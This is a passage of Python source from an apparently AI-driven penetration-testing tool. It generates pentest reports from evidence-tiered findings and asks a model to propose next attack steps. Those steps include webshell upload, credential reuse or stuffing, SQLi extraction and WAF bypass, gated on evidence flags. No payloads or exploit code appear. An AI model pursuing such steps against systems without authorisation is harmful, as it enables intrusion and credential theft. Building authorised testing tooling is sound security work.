                    "report_fix_sqli_crosscheck",
                    "Re-test SQLi candidates with stable controls.",
                ))
            if not lines:
                lines.append(_report_msg(
                    "report_fix_backlog_generic",
                    "Re-test backlog items according to their evidence tier.",
                ))
            return "\n".join(f"- {line.lstrip('- ')}" for line in lines) + "\n"

        fix_lines = _fallback_fix_lines()
        no_verified = {
            "ko": "- 확인된 취약점 없음",
            "zh": "- 未确认漏洞",
            "en": "- No verified vulnerabilities",
        }.get(lang, "- No verified vulnerabilities")
        backlog_label = {
            "ko": "검증 대기 항목 (취약점 미확정)",
            "zh": "待验证项目（未确认漏洞）",
            "en": "Verification Backlog (Unconfirmed)",
        }.get(lang, "Verification Backlog (Unconfirmed)")
        verified_text = "\n".join(confirmed_truth) or no_verified
        backlog_text = "\n".join(backlog_truth) or "- None"
        evidence_text = {
            "ko": "- 확정되지 않은 관찰은 아래 검증 대기 목록에만 표시했습니다.",
            "zh": "- 未确认的观察仅保留在下面的待验证列表中。",
            "en": "- Unconfirmed observations are kept only in the verification backlog below.",
        }.get(lang, "- Unconfirmed observations are kept only in the verification backlog below.")
        return (
            f"# Target: {target}\n"
            f"## {summary}\n"
            f"{fallback_note}\n"
            f"- {metrics[0]}: {confirmed_count}\n"
            f"- {metrics[1]}: {potential_count}\n\n"
            f"## {vulns}\n{verified_text}\n\n"
            f"## {evidence}\n{evidence_text}\n\n"
            f"## {backlog_label}\n{backlog_text}\n\n"
            f"## {creds}\n{credential_lines}\n\n"
            f"## {fixes}\n{fix_lines}"
        )

    def _auto_generate_report(self) -> None:
        """작업 완료/중단 시 지금까지 발견한 내용을 자동으로 마크다운 보고서로 저장."""
        from ..models.registry import ModelRegistry
        from rich.rule import Rule
        from pathlib import Path
        # datetime 클래스는 파일 최상단 'from datetime import datetime'으로 이미 임포트됨.
        # 여기서 'import datetime' (모듈)을 하면 클래스를 덮어써서
        # datetime.now() → AttributeError 발생 → 제거

        model_cfg = self.config.get_active_model_config()
        _lang = getattr(self.config, "lang", "en")
        _lang_label = {"ko": "Korean", "zh": "Chinese (Simplified)", "en": "English"}.get(_lang, "English")
        _state = self._agent_state
        target = _state.get("target", "unknown")

        # 보고서 저장 경로 — BINGO_REPORTS_DIR 환경변수 우선, 없으면 Desktop/dump/타겟명/
        import os as _os_report
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_target = (target or "unknown").replace("https://", "").replace("http://", "").replace("/", "_")[:30]
        _env_dir = _os_report.environ.get("BINGO_REPORTS_DIR", "").strip()
        if _env_dir:
            report_dir = Path(_env_dir)
        else:
            # Desktop/dump/타겟명/ 에 저장 (get_desktop_dump_dir와 동일 규칙)
            import platform as _plat_report
            _raw_target = (target or "unknown").replace("https://", "").replace("http://", "").rstrip("/")
            _target_name = _raw_target.replace("/", "_").replace(":", "_")[:50]
            if _plat_report.system() == "Darwin":
                _desktop = Path.home() / "Desktop"
            elif _plat_report.system() == "Windows":
                import winreg as _wr
                try:
                    _k = _wr.OpenKey(_wr.HKEY_CURRENT_USER,
                                     r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
                    _desktop = Path(_wr.QueryValueEx(_k, "Desktop")[0])
                except Exception:
                    _desktop = Path.home() / "Desktop"
            else:
                _desktop = Path(
                    _os_report.environ.get("XDG_DESKTOP_DIR",
                                           str(Path.home() / "Desktop"))
                )
            report_dir = _desktop / "dump" / _target_name
        try:
            report_dir.mkdir(parents=True, exist_ok=True)
        except Exception as _mkdir_err:
            # 경로 생성 실패 → 현재 디렉토리 fallback
            self.console.print(
                f"[{THEME['warn']}]⚠ Cannot create report dir {report_dir}: {_mkdir_err} → using current dir[/]"
            )
            report_dir = Path.cwd()
        report_path = report_dir / f"report_{safe_target}_{ts}.md"
        html_report_path = report_path.with_suffix(".html")

        # 저장 경로 미리 출력 — 사용자가 어디 저장되는지 알 수 있게
        self.console.print(
            f"\n[{THEME['secondary']}]ARTIFACTS[/] [{THEME['dim']}]// report sink[/]\n"
            f"   [{THEME['primary']}]MD[/]   [bold white]{report_path.absolute()}[/bold white]\n"
            f"   [{THEME['primary']}]HTML[/] [{THEME['dim']}]{html_report_path.absolute()}[/]\n"
            f"   [{THEME['dim']}]override with BINGO_REPORTS_DIR[/]\n"
        )

        # AI에게 보고서 생성 요청 (히스토리 오염 없이)
        last_assistant_msgs = [
            m.content for m in self.history[-12:] if m.role == "assistant"
        ]
        context = "\n\n---\n\n".join(last_assistant_msgs[-4:])[:3000]

        _s = self.s
        _sec = {
            "summary":  {"ko": "요약",           "zh": "摘要",           "en": "Summary"},
            "vulns":    {"ko": "발견된 취약점",   "zh": "发现的漏洞",     "en": "Vulnerabilities Found"},
            "evidence": {"ko": "증거 (페이로드)", "zh": "证据（载荷）",   "en": "Evidence (Payloads)"},
            "creds":    {"ko": "추출된 자격증명", "zh": "提取的凭据",     "en": "Credentials Extracted"},
            "fix":      {"ko": "권고 조치",       "zh": "修复建议",       "en": "Recommended Fix"},
        }
        def _h(key): return _sec[key].get(_lang, _sec[key]["en"])

        # ── 세션 구분 정보 수집 (보고서 환각 방지) ──────────────────────
        _session_tables  = getattr(self, "_session_tables", [])
        _session_creds   = BingoTerminal._filter_verified_report_credentials(
            getattr(self, "_session_credentials", [])
        )
        _session_fresh   = getattr(self, "_session_fresh", True)
        # 이전 세션 복원이면 어떤 항목이 이전 세션에서 왔는지 구분
        _prev_tables = [t for t in _state.get("tables", []) if t not in _session_tables]
        _prev_creds  = [c for c in _state.get("credentials", []) if c not in _session_creds]
        _session_origin_note = ""
        if not _session_fresh and (_prev_tables or _prev_creds):
            _session_origin_note = (
                f"\n⚠️ SESSION ORIGIN NOTICE (CRITICAL — READ CAREFULLY):\n"
                f"This session was RESUMED from a previous run.\n"
                f"Items confirmed ONLY IN THIS SESSION:\n"
                f"  Tables    : {_session_tables or 'none confirmed yet'}\n"
                f"  Credentials: {_session_creds or 'none confirmed yet'}\n"
                f"Items from PREVIOUS SESSION (NOT re-verified this run):\n"
                f"  Tables    : {_prev_tables}\n"
                f"  Credentials: {_prev_creds}\n"
                f"RULE: In the Credentials Extracted section, list ONLY items from THIS SESSION.\n"
                f"For previous-session items, note them as '⚠️ From previous session (not re-verified)'.\n"
            )
        elif _session_fresh and not _session_tables and not _session_creds:
            _session_origin_note = (
                f"\n⚠️ SESSION ACCURACY NOTICE:\n"
                f"This is a FRESH session. No credentials or tables were loaded from previous sessions.\n"
                f"Confirmed in this session — Tables: {_session_tables}, Credentials: {_session_creds}.\n"
                f"RULE: Only report what was actually discovered in this session's execution history.\n"
                f"DO NOT invent or assume any credentials, table names, or database names not present in the recent findings context.\n"
            )

        # v6.2.175/176 Type A: findings JSON 스냅샷을 보고서에 강제 주입
        _fe_confirmed_n = 0
        _fe_potential_n = 0
        _fe_snap_block = ""
        _fe_report_findings: list = []
        _fe = None
        try:
            _fe = getattr(self, "_findings_exporter", None)
            if _fe is not None and hasattr(_fe, "ground_truth_block"):
                if hasattr(_fe, "revalidate_quarantined"):
                    _fe.revalidate_quarantined()
                _stats = _fe.stats() if hasattr(_fe, "stats") else {}
                _fe_report_findings = list(getattr(_fe, "findings", []))
                _fe_confirmed_n = int(_stats.get("confirmed", 0) or 0)
                _fe_potential_n = int(
                    (_stats.get("probable", 0) or 0)
                    + (_stats.get("potential_critical", 0) or 0)
                    + (_stats.get("potential_high", 0) or 0)
                )
                _fe_snap_block = (
                    f"\n⚠️ FINDINGS GROUND TRUTH (HARD RULE — DO NOT CONTRADICT):\n"
                    + _fe.ground_truth_block()
                    + "\nEVIDENCE LADDER RULES:\n"
                    + "1) tier=confirmed ONLY → MAY write 已确认/Confirmed/Critical Confirmed.\n"
                    + "2) tier=probable → list ONLY as an unconfirmed verification item; never in confirmed vulnerabilities.\n"
                    + "3) tier=potential → list ONLY as an unconfirmed verification item; never in confirmed vulnerabilities.\n"
                    + "4) tier=quarantined → unresolved candidate; never claim as vuln, never discard.\n"
                    + "5) tier=blocked → WAF/oracle event only; NOT proven vuln.\n"
                    + "6) Fake hashes / login forms are NEVER credentials.\n"
                    + "7) CONFIRMED requires extraction/RCE/browser proof — 100% evidence bar.\n"
                )
            elif _fe is not None:
                _fe_snap_lines = []
                for _f in list(_fe.findings):
                    _c = bool(getattr(_f, "confirmed", False))
                    if _c:
                        _fe_confirmed_n += 1
                    if getattr(_f, "confidence", "") in ("potential", "inconclusive"):
                        _fe_potential_n += 1
                    _fe_snap_lines.append(
                        f"- id={getattr(_f,'id','')} type={getattr(_f,'vuln_type','')} "
                        f"sev={getattr(_f,'severity','')} confirmed={_c}"
                    )
                _fe_snap_block = (
                    f"\n⚠️ FINDINGS GROUND TRUTH:\n"
                    + ("\n".join(_fe_snap_lines) if _fe_snap_lines else "- (none)\n")
                )
        except Exception:
            _fe_snap_block = ""
            _fe_confirmed_n = 0
            _fe_potential_n = 0

        _force_deterministic_report = (_fe is not None and _fe_confirmed_n == 0)

        prompt_msg = Message(
            role="user",
            content=(
                f"[GENERATE FINAL PENTEST REPORT]\n\n"
                f"Target: {target}\n"
                f"Known state: {_state}\n"
                f"{_session_origin_note}\n"
                f"{_fe_snap_block}\n"
                f"Recent findings:\n{context}\n\n"
                f"Write a concise penetration test report in {_lang_label}.\n"
                f"Use EXACTLY these section headers:\n"
                f"# Target: {target}\n"
                f"## {_h('summary')}\n"
                f"## {_h('vulns')} (severity: Critical/High/Medium/Low)\n"
                f"## {_h('evidence')}\n"
                f"## {_h('creds')}\n"
                f"## {_h('fix')}\n\n"
                f"Every vulnerability item MUST include its exact BINGO finding ID. "
                f"Do not add a vulnerability type, URL, parameter, or evidence absent from FINDINGS GROUND TRUTH.\n"
                f"The vulnerabilities section may contain tier=confirmed items ONLY. "
                f"Put probable/potential items in the evidence section and label each explicitly Unconfirmed/Potential.\n"
                f"NO code blocks. Plain markdown only. Be concise."
            )
        )

        temp_messages = (
            [self._get_system_message("")] + self.history[-8:] + [prompt_msg]
            if model_cfg else []
        )

        # ── v6.2.74: 해커 스타일 보고서 생성 헤더 ──────────────────────
        _gen_label = self.s.get('report_generating', 'Generating Report')
        # ── v6.2.80: Rich Panel로 교체 ──────────────────────────────
        from rich.panel import Panel as _HdrPanel
        from rich.text import Text as _HdrText
        _ht = _HdrText()
        _ht.append("BINGO REPORT FORGE\n", style=THEME["primary"])
        _ht.append("target  ", style=THEME["dim"])
        _ht.append(target, style=THEME["accent"])
        self.console.print(_HdrPanel(
            _ht,
            title=f"[{THEME['secondary']}] artifact pipeline [/]",
            border_style=THEME["border"],
            padding=(0, 2),
        ))

        full = ""
        _deterministic_report = False
        if model_cfg and not _force_deterministic_report:
            try:
                model = ModelRegistry.build(model_cfg)
                _now_r = datetime.now().strftime("%H:%M:%S")
                self.console.print(
                    f"\n[{THEME['dim']}]──[/] [{THEME['secondary']}]report[/]"
                    f" [{THEME['dim']}]// {_now_r} //[/] [{THEME['primary']}]rendering[/]"
                )

                with Live(console=self.console, refresh_per_second=15, transient=True) as live:
                    from rich.text import Text as _Text
                    for chunk in model.chat_stream(temp_messages):
                        if chunk.error:
                            raise RuntimeError(chunk.error)
                        if chunk.text:
                            full += chunk.text
                            live.update(_Text(full, style="white"))
            except Exception as e:
                self._error(f"report error: {e}")

        if not full.strip():
            _fallback_msg = self.s.get(
                "report_fallback_used",
                "Report model unavailable — writing local evidence fallback",
            )
            self.console.print(f"[{THEME['warn']}]{_fallback_msg}[/]")
            full = self._build_fallback_report(
                target=target,
                lang=_lang,
                confirmed_count=_fe_confirmed_n,
                potential_count=_fe_potential_n,
                ground_truth=_fe_snap_block,
                session_credentials=list(_session_creds),
            )
            _deterministic_report = True

        report_valid, report_errors = BingoTerminal._validate_report_finding_ids(
            full, _fe_report_findings
        )
        if not report_valid:
            _invalid_msg = self.s.get(
                "report_ground_truth_autocorrected",
                "Report claims did not match Finding IDs; using deterministic evidence report",
            )
            if _os_report.environ.get("BINGO_DEBUG"):
                self.console.print(
                    f"[{THEME['warn']}]{_invalid_msg}: {', '.join(report_errors[:4])}[/]"
                )
            full = self._build_fallback_report(
                target=target,
                lang=_lang,
                confirmed_count=_fe_confirmed_n,
                potential_count=_fe_potential_n,
                ground_truth=_fe_snap_block,
                session_credentials=list(_session_creds),
            )
            _deterministic_report = True

        if not _deterministic_report:
            full = BingoTerminal._sanitize_report_confirmed_claims(
                full,
                confirmed_count=_fe_confirmed_n,
                potential_count=_fe_potential_n,
            )
        try:
            report_path.write_text(full.strip(), encoding="utf-8")
        except Exception as _write_err:
            report_path = Path.cwd() / f"report_{safe_target}_{ts}.md"
            html_report_path = report_path.with_suffix(".html")
            report_path.write_text(full.strip(), encoding="utf-8")
            self.console.print(
                f"[{THEME['warn']}]⚠ Report path write failed ({_write_err}); "
                f"saved to {report_path.absolute()}[/]"
            )
        try:
            html_report_path.write_text(
                BingoTerminal._build_html_report(
                    full.strip(),
                    target=target,
                    confirmed_count=_fe_confirmed_n,
                    potential_count=_fe_potential_n,
                    generated_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                ),
                encoding="utf-8",
            )
        except Exception as _html_write_err:
            self.console.print(
                f"[{THEME['warn']}]⚠ HTML report write failed: {_html_write_err}[/]"
            )
        self.console.print()
        try:
            self._render_hacker_report(full.strip(), target)
        except Exception as _render_err:
            self._error(f"report render error: {_render_err}")
        _rp_str = str(report_path.absolute())
        _hp_str = str(html_report_path.absolute())
        _ok_label = self.s.get("report_save_ok", "REPORT SAVED SUCCESSFULLY")
        _now_ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        from rich.text import Text as _OkText
        _ot = _OkText()
        _ot.append(f"✔ {_ok_label}\n", style=THEME["success"])
        _ot.append("MD   : ", style=THEME["dim"])
        _ot.append(_rp_str + "\n", style="bold white")
        _ot.append("HTML : ", style=THEME["dim"])
        _ot.append(_hp_str + "\n", style=THEME["secondary"])
        _ot.append("TIME : ", style=THEME["dim"])
        _ot.append(_now_ts, style=THEME["dim"])
        from rich.panel import Panel as _OkPanel
        self.console.print(_OkPanel(_ot, border_style=THEME["success"], padding=(0, 2)))

        try:
            self._converge_session_artifacts(report_path, target, html_path=html_report_path)
        except Exception:
            pass
        self._suggest_next_steps()

        # ── v3.2.96: findings JSON 자동 저장 ─────────────────────────
        try:
            _fe_path = self._findings_exporter.save()
            if _fe_path:
                _fe_sum = self._findings_exporter.summary()
                _lang_fe = getattr(self.config, "lang", "en")
                _fe_done = self.s.get(
                    "fe_session_saved",
                    {"ko": "📊 발견 JSON 저장됨", "zh": "📊 发现 JSON 已保存", "en": "📊 Findings JSON Saved"},
                )
                _fe_done_str = _fe_done.get(_lang_fe, _fe_done.get("en", "📊 Findings JSON Saved")) \
                    if isinstance(_fe_done, dict) else str(_fe_done)
                # ── v6.2.80: Rich Panel로 교체 ───────────────────────────
                from rich.text import Text as _FeText
                from rich.panel import Panel as _FePanel
                _ft = _FeText()
                _ft.append(_fe_sum + "\n", style=THEME["dim"])
                _ft.append(str(_fe_path.absolute()), style="bold white")
                self.console.print(_FePanel(
                    _ft,
                    title=f"[{THEME['secondary']}] {_fe_done_str} [/]",
                    border_style=THEME["secondary"],
                    padding=(0, 2),
                ))
                # findings 저장 후에도 수렴 인덱스 갱신
                try:
                    self._converge_session_artifacts(
                        report_path,
                        target,
                        findings_path=_fe_path,
                        html_path=html_report_path,
                    )
                except Exception:
                    pass
        except Exception:
            pass

    def _converge_session_artifacts(
        self,
        report_path: "Path | None",
        target: str,
        findings_path: "Path | None" = None,
        html_path: "Path | None" = None,
    ) -> None:
        """v6.2.172: 보고서 / findings JSON / 세션 로그를 하나의 INDEX로 자동 수렴.

        문제: 보고서·findings·session.md 가 따로 생성되어 구 보고서가 신규 증거를 누락.
        해결: INDEX 파일을 갱신하고, 보고서/세션에 cross-link + findings 요약을 덧붙임.
        """
        from pathlib import Path as _P
        import json as _json
        import time as _t

        _fe = getattr(self, "_findings_exporter", None)
        # findings_path가 없으면 재저장하지 않음 (중복 JSON 생성 방지)
        # 메모리 상의 findings 스냅샷만 사용

        _session = getattr(self, "_session_log_path", None)
        _sum = ""
        _findings_brief = []
        if _fe is not None:
            try:
                _sum = _fe.summary() or ""
                for _f in list(_fe.findings)[:30]:
                    _findings_brief.append({
                        "id": getattr(_f, "id", ""),
                        "severity": getattr(_f, "severity", ""),
                        "vuln_type": getattr(_f, "vuln_type", ""),
                        "title": (getattr(_f, "title", "") or "")[:120],
                        "confirmed": bool(getattr(_f, "confirmed", False)),
                    })
            except Exception:
                pass

        # INDEX 저장 위치: report와 같은 dump 폴더, 없으면 세션 폴더
        _index_dir = None
        if report_path is not None:
            _index_dir = _P(report_path).parent
        elif findings_path is not None:
            _index_dir = _P(findings_path).parent
        elif _session is not None:
            _index_dir = _P(_session).parent
        else:
            return

        try:
            _index_dir.mkdir(parents=True, exist_ok=True)
        except Exception:
            return

        _safe = (target or "unknown").replace("https://", "").replace("http://", "").replace("/", "_")[:40]
        _index_path = _index_dir / f"INDEX_{_safe}.md"
        _index_json = _index_dir / f"INDEX_{_safe}.json"

        _rp = str(_P(report_path).absolute()) if report_path else ""
        _hp = str(_P(html_path).absolute()) if html_path else ""
        _fp = str(_P(findings_path).absolute()) if findings_path else ""
        _sp = str(_P(_session).absolute()) if _session else ""

        _md = (
            f"# Bingo Session Index\n\n"
            f"- target: `{target}`\n"
            f"- updated: `{_t.strftime('%Y-%m-%d %H:%M:%S')}`\n"
            f"- report: `{_rp or 'N/A'}`\n"
            f"- html_report: `{_hp or 'N/A'}`\n"
            f"- findings: `{_fp or 'N/A'}`\n"
            f"- session: `{_sp or 'N/A'}`\n"
            f"- summary: {_sum or 'no findings'}\n\n"
            f"## Findings Snapshot\n\n"
        )
        if _findings_brief:
            for _fb in _findings_brief:
                _conf = "CONFIRMED" if _fb.get("confirmed") else "unconfirmed"
                _md += (
                    f"- [{_fb.get('severity','?')}] {_fb.get('vuln_type','?')} "
                    f"— {_fb.get('title','')} ({_conf})\n"
                )
        else:
            _md += "- (none)\n"

        try:
            _index_path.write_text(_md, encoding="utf-8")
        except Exception:
            pass

        try:
            _index_json.write_text(_json.dumps({
                "target": target,
                "updated_at": _t.strftime("%Y-%m-%d %H:%M:%S"),
                "report": _rp,
                "html_report": _hp,
                "findings": _fp,
                "session": _sp,
                "summary": _sum,
                "findings_snapshot": _findings_brief,
            }, ensure_ascii=False, indent=2), encoding="utf-8")
        except Exception:
            pass

        # 보고서에 findings 요약 + cross-link append/갱신
        if report_path is not None:
            try:
                _rp_obj = _P(report_path)
                if _rp_obj.exists():
                    _cur = _rp_obj.read_text(encoding="utf-8", errors="replace")
                    _append = (
                        f"\n\n---\n## Converged Artifacts\n\n"
                        f"- INDEX: `{_index_path}`\n"
                        f"- HTML Report: `{_hp or 'N/A'}`\n"
                        f"- Findings JSON: `{_fp or 'N/A'}`\n"
                        f"- Session log: `{_sp or 'N/A'}`\n"
                        f"- Summary: {_sum or 'no findings'}\n"
                    )
                    if _findings_brief:
                        _append += "\n### Findings Snapshot\n\n"
                        for _fb in _findings_brief:
                            _conf = "CONFIRMED" if _fb.get("confirmed") else "unconfirmed"
                            _append += (
                                f"- [{_fb.get('severity','?')}] {_fb.get('vuln_type','?')} "
                                f"— {_fb.get('title','')} ({_conf})\n"
                            )
                    if "## Converged Artifacts" in _cur:
                        # 기존 섹션 교체 (findings 경로 갱신)
                        import re as _re_cv
                        _cur = _re_cv.sub(
                            r"\n---\n## Converged Artifacts[\s\S]*$",
                            _append.rstrip() + "\n",
                            _cur,
                            count=1,
                        )
                        _rp_obj.write_text(_cur, encoding="utf-8")
                    else:
                        _rp_obj.write_text(_cur + _append, encoding="utf-8")
            except Exception:
                pass

        # 세션 로그에도 수렴 포인터 기록 (중복 방지)
        if _session is not None:
            try:
                _sp_obj = _P(_session)
                _already = False
                if _sp_obj.exists():
                    _already = "=== CONVERGED ARTIFACTS ===" in _sp_obj.read_text(
                        encoding="utf-8", errors="replace"
                    )[-3000:]
                if not _already:
                    self._append_to_session_log(
                        "tool_result",
                        (
                            f"=== CONVERGED ARTIFACTS ===\n"
                            f"INDEX: {_index_path}\n"
                            f"REPORT: {_rp or 'N/A'}\n"
                            f"HTML_REPORT: {_hp or 'N/A'}\n"
                            f"FINDINGS: {_fp or 'N/A'}\n"
                            f"SUMMARY: {_sum or 'no findings'}\n"
                            f"=== END CONVERGED ==="
                        ),
                    )
            except Exception:
                pass

        _lang = getattr(self.config, "lang", "en")
        _msg = {
            "ko": f"📎 산출물 자동 수렴: {_index_path}",
            "zh": f"📎 产物已自动汇总: {_index_path}",
            "en": f"📎 Artifacts converged: {_index_path}",
        }.get(_lang, f"📎 Artifacts converged: {_index_path}")
        try:
            self.console.print(f"[{THEME['dim']}]{_msg}[/]")
        except Exception:
            pass

    def _suggest_next_steps(self) -> None:
        """Agent 루프 중단/보고서 생성 후 AI가 현황 요약 + 선택지 3~5개를 제시한다.
        사용자가 번호를 입력하면 해당 선택지를 자동으로 실행 (인터랙티브).
        히스토리를 오염시키지 않고 전용 패널로 시각적으로 구분해서 표시.

        ★ thread-safety: prompt_toolkit은 메인 스레드에서만 동작.
           백그라운드(오케스트레이터) 스레드에서 호출되면 조기 종료.
        """
        import re
        import threading as _thr_mod
        if _thr_mod.current_thread() is not _thr_mod.main_thread():
            # 백그라운드 스레드에서 호출됨 — 안전하지 않으므로 즉시 반환
            return

        from ..models.registry import ModelRegistry
        from rich.panel import Panel as _Panel
        from rich.rule import Rule
        from rich.table import Table as _Table

        model_cfg = self.config.get_active_model_config()
        if not model_cfg:
            return

        _lang = getattr(self.config, "lang", "en")
        _lang_label = {"ko": "Korean", "zh": "Chinese (Simplified)", "en": "English"}.get(_lang, "English")

        _state = self._agent_state
        last_ai_msgs = [
            m.content for m in self.history[-6:]
            if m.role == "assistant"
        ]
        recent_context = "\n---\n".join(last_ai_msgs[-2:])[:2000] if last_ai_msgs else ""

        _s = self.s
        _summary_label = _s.get("progress_summary", "Summary")
        _options_label  = _s.get("next_steps_title", "Next Options")
        _option_hint = {
            "ko": "구체적인 bingo 입력 명령어 또는 지시문",
            "zh": "具体的 bingo 输入指令或说明",
            "en": "exact bingo command or instruction",
        }.get(_lang, "exact command")

        # 아직 수행하지 않은 공격 항목 추출 (컨텍스트 힌트)
        # v6.2.175: 증거 없으면 webshell/撞库 힌트 자체를 넣지 않음
        _fe_flags = {}
        _fe_gt = ""
        _fe_confirmed_n = 0
        _fe_potential_n = 0
        _fe = None
        try:
            _fe = getattr(self, "_findings_exporter", None)
            if _fe is not None:
                if hasattr(_fe, "evidence_flags"):
                    _fe_flags = _fe.evidence_flags()
                    _fe_potential_n = int(_fe_flags.get("potential_count", 0) or 0)
                if hasattr(_fe, "ground_truth_block"):
                    _fe_gt = _fe.ground_truth_block()
                if hasattr(_fe, "stats"):
                    _st = _fe.stats()
                    _fe_confirmed_n = int(_st.get("confirmed", 0) or 0)
                    if not _fe_potential_n:
                        _fe_potential_n = int(
                            (_st.get("potential_critical", 0) or 0)
                            + (_st.get("potential_high", 0) or 0)
                        )
        except Exception:
            pass

        _safe_hints = []
        if _fe_flags.get("has_upload"):
            _safe_hints.append("webshell upload (upload form confirmed)")
        if _fe_flags.get("has_real_cred"):
            _safe_hints.append("password cracking / credential reuse (real hash/cred confirmed)")
        if _fe_flags.get("has_confirmed_sqli"):
            _safe_hints.append("deep SQLi extraction (SQLi CONFIRMED)")
        elif _fe_flags.get("has_potential_sqli") or _fe_flags.get("blocked_count"):
            _safe_hints.append(
                "CONTINUE SQLi verification / WAF bypass (potential or blocked — DO NOT abandon)"
            )
        else:
            _safe_hints.append("re-validate boolean oracle / WAF bypass (SQLi NOT confirmed)")
        _safe_hints.extend([
            "API endpoint fuzzing / unauthenticated API",
            "IDOR privilege escalation",
            "ACPV client-side auth bypass",
        ])
        _untested_hint = "; ".join(_safe_hints)

        prompt_msg = Message(
            role="user",
            content=(
                "[INTERACTIVE NEXT STEPS — PENTEST CONTINUATION]\n\n"
                f"Target: {_state.get('target', 'unknown')}\n"
                f"Current state: {_state}\n\n"
                f"⚠️ FINDINGS GROUND TRUTH (DO NOT CONTRADICT):\n{_fe_gt or '(none)'}\n\n"
                f"Evidence flags: {_fe_flags}\n"
                f"HARD RULES:\n"
                f"- If confirmed=0: summary MUST say UNCONFIRMED / 未确认, NEVER 已确认/Confirmed Critical.\n"
                f"- Do NOT suggest webshell upload unless has_upload=true.\n"
                f"- Do NOT suggest credential stuffing / 撞库 / mb_id 'aaa' unless has_real_cred=true.\n"
                f"- Do NOT treat WAF 490B blocks as confirmed SQLi.\n\n"
                f"Recent activity:\n{recent_context}\n\n"
                f"Hint — potentially useful next actions: {_untested_hint}\n\n"
                f"INSTRUCTIONS (CRITICAL — follow EXACTLY):\n"
                f"1. Plain text ONLY. NO code blocks. NO markdown headers (#).\n"
                f"2. Respond ENTIRELY in {_lang_label}.\n"
                f"3. Output in EXACTLY this format (nothing else):\n\n"
                f"{_summary_label}: [1-2 sentences about current status]\n\n"
                f"{_options_label}:\n"
                f"1. [{_option_hint}]\n"
                f"2. [{_option_hint}]\n"
                f"3. [{_option_hint}]\n"
                f"4. [{_option_hint}]\n"
                f"5. [{_option_hint}]"
            )
        )

        temp_messages = [self._get_system_message("")] + self.history[-10:] + [prompt_msg]

        _after_report_title = _s.get("next_steps_after_report", "Report done — choose next step")
        self.console.print(Rule(
            f"[bold cyan]💡 {_after_report_title}[/bold cyan]",
            style="cyan"
        ))

        try:
            model = ModelRegistry.build(model_cfg)
            full = ""
            self.console.print(f"\n[{THEME['secondary']}]bingo[/] [{THEME['dim']}]▸[/]", end=" ")

            with Live(console=self.console, refresh_per_second=15, transient=True) as live:
                from rich.text import Text as _Text
                for chunk in model.chat_stream(temp_messages):
                    if chunk.error:
                        live.stop()
                        self._error(chunk.error)
                        return
                    if chunk.text:
                        full += chunk.text
                        live.update(_Text(full, style="white"))

            if not full.strip():
                return

            self.console.print()

            # ── 선택지 파싱 (1. ... / 2. ... / 3. ...) ──────────────
            lines = full.strip().splitlines()
            options: list[str] = []
            summary_lines: list[str] = []
            in_options = False

            for line in lines:
                stripped = line.strip()
                # 선택지 섹션 시작 감지
                _opt_markers = [
                    _s.get("next_steps_title", "Next Options"),
                    "Next Options", "다음 단계", "选择操作", "选项",
                ]
                if any(stripped.startswith(m) for m in _opt_markers):
                    in_options = True
                    continue
                if in_options:
                    # "1. xxx", "① xxx", "(1) xxx" 패턴 모두 허용
                    m = re.match(r'^[①②③④⑤1-5][\.\)]\s*(.+)$', stripped)
                    if m:
                        options.append(m.group(1).strip())
                    elif re.match(r'^[①②③④⑤]', stripped):
                        options.append(re.sub(r'^[①②③④⑤]\s*', '', stripped))
                elif stripped:
                    summary_lines.append(stripped)

            # 파싱 실패 시 번호 패턴으로 재시도 (전체 텍스트 대상)
            if not options:
                for line in lines:
                    m = re.match(r'^[①②③④⑤1-5][\.\)\s]+(.+)$', line.strip())
                    if m:
                        options.append(m.group(1).strip())

            # ── 출력 ──────────────────────────────────────────────────
            from rich.markup import escape as _esc

            # v6.2.175: progress summary + next_steps ground-truth 교정
            if summary_lines:
                _sum_joined = " ".join(summary_lines[:5])
                _sum_joined = BingoTerminal._sanitize_next_step_summary(
                    _sum_joined,
                    _fe_flags,
                    _lang,
                    confirmed_count=_fe_confirmed_n,
                    potential_count=_fe_potential_n,
                )
                summary_lines = [_sum_joined]
            if options:
                options = [
                    BingoTerminal._sanitize_ground_truth_claims(
                        o,
                        confirmed_count=_fe_confirmed_n,
                        potential_count=_fe_potential_n,
                    )
                    for o in options
                ]
                options = BingoTerminal._filter_next_steps_by_evidence(options, _fe_flags)
            if _fe is not None and _fe_confirmed_n == 0 and len(options) < 3:
                _det_summary, _det_options = BingoTerminal._build_evidence_based_next_steps(
                    _lang,
                    _fe_flags,
                    confirmed_count=_fe_confirmed_n,
                    potential_count=_fe_potential_n,
                )
                summary_lines = [_det_summary]
                options = _det_options

            # ── 요약 출력 (v6.2.80: Rich Panel) ─────────────────────────
            if summary_lines:
                from rich.panel import Panel as _SumPanel
                from rich.text import Text as _SumText
                summary_text = " ".join(summary_lines[:3])
                _st = _SumText()
                for _sl in summary_text.split(". ")[:3]:
                    if _sl.strip():
                        _st.append(_sl.strip() + "\n")
                self.console.print(_SumPanel(
                    _st,
                    title=f"[{THEME['dim']}] {_esc(_summary_label)} [/]",
                    border_style=THEME["dim"],
                    padding=(0, 2),
                ))

            if options:
                # ── 선택지 (v6.2.80: Rich Panel) ─────────────────────
                from rich.panel import Panel as _OptPanel
                from rich.text import Text as _OptText
                _ot = _OptText()
                for i, opt in enumerate(options, 1):
                    _ot.append(f"[{i}] ", style=THEME["primary"])
                    _ot.append(_esc(opt) + "\n")
                self.console.print(_OptPanel(
                    _ot,
                    title=f"[{THEME['accent']}] {_esc(_options_label)} [/]",
                    border_style=THEME["accent"],
                    padding=(0, 2),
                ))

                # ── 번호 입력 대기 ────────────────────────────────────
                _prompt_txt = _s.get(
                    "next_steps_prompt",
                    "Enter number + Enter (0 = exit, other = type freely)"
                )
                self.console.print(
                    f"[{THEME['accent']}]▶[/] [{THEME['dim']}]{_prompt_txt}[/]"
                )
                self.console.print()

                # ── /dev/tty 직접 입력 (prompt_toolkit 충돌 방지) ─────────
                # v6.2.170: binary 모드 + errors='replace' + select() timeout 5min
                # → utf-8 codec 오류 및 먹통(무한 대기) 방지
                _tty_path = "/dev/tty"
                import os as _os_ns
                import signal as _sig_mod
                import select as _sel_mod
                raw = ""
                _old_sigint = _sig_mod.getsignal(_sig_mod.SIGINT)
                try:
                    _sig_mod.signal(_sig_mod.SIGINT, _sig_mod.SIG_DFL)
                    if _os_ns.path.exists(_tty_path):
